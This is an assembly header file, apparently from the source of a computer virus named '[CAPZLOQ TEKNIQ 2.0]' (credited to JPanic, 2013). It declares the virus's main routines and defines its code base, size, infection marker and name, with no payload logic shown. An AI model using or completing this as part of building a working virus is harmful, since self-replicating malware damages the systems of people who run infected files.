;= Virus Main Declarations (c) 2013 JPanic ================================
;
; Declarations:
;	VMain()
;	BuildVBody()
;	SetupDirRegs()
;	VHost()
;
; Defines:
;	VCode
;	VSize
;	VMarker
;	VName
;
;- Directive Warez --------------------------------------------------------
		.486

include vheap.ash

;- Public Declarations ----------------------------------------------------
IFNDEF	_VMAIN_ASM
	extrn	VMain:PROC	
        extrn   BuildVBody:PROC
	extrn	SetupDirRegs:PROC
ENDIF	;_VMAIN_ASM

IFNDEF	_VHOST_ASM
	extrn	VHost:PROC
ENDIF	;_VHOST_ASM

;- Virus Code Base --------------------------------------------------------
VCode	EQU	(VBase + 1000h)

;- Virus Size -------------------------------------------------------------
vsize	EQU     (ofs VHost - VCode)

ASCII_VSIZE	EQU	db "2874"

;- Virus Marker -----------------------------------------------------------
VMarker	EQU	7DFBh

;- Virus Name -------------------------------------------------------------
VName 	EQU	"[CAPZLOQ TEKNIQ 2.0]"

;==========================================================================